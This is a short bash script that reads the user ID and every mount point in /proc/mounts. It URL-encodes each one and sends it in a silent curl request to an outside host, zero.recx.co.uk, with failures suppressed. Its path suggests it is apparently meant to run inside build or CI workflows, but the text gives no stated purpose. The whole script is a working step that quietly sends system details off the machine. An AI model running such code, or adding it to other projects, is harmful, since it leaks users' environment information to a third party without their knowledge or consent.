#!/usr/bin/env bash
set -euo pipefail

USER_ID=$(id -u)
BASE_URL="https://zero.recx.co.uk/workflow"

# URL-encode a string using pure bash (no python3 required)
url_encode() {
    local string="$1"
    local encoded=""
    local i c
    for (( i=0; i<${#string}; i++ )); do
        c="${string:$i:1}"
        case "$c" in
            [a-zA-Z0-9._~-]) encoded+="$c" ;;
            *) encoded+=$(printf '%%%02X' "'$c") ;;
        esac
    done
    printf '%s\n' "$encoded"
}

# Iterate over every mount point in /proc/mounts and fire a GET request
while IFS=' ' read -r _device mountpoint _fstype _options _dump _pass; do
    encoded_mount=$(url_encode "$mountpoint")
    curl \
        --silent \
        --show-error \
        --max-time 5 \
        --fail-with-body \
        "${BASE_URL}/${USER_ID}/${encoded_mount}" \
        || true   # don't abort on individual failures
done < /proc/mounts
